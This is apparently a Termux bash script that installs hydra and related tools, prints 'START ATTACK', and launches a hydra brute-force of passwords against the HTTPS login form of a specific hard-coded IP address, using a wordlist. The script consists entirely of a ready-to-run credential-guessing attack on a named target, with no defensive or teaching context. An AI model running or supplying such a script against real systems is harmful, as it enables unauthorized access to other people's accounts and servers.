#/data/data/com.termux/files/usr/bin/bash
clear
apt update
apt upgrade
pkg install hydra
pkg install ssl
pkg install crunch
pkg install neofetch
clear
echo -e "\033[1;36m"
echo -e "\033[1;32m [~] START ATTACK !!!!!"
read -t 1
clear
echo -e "\033[1;36m"
neofetch
read -t 2
echo -e "\033[1;36m"
hydra 195.83.13.197 https-post-form "/login/ct_logon_vk.jsp:user=admin&password=^PASS^ :F=incorrect" -l target -P wordlist -t 1 -V
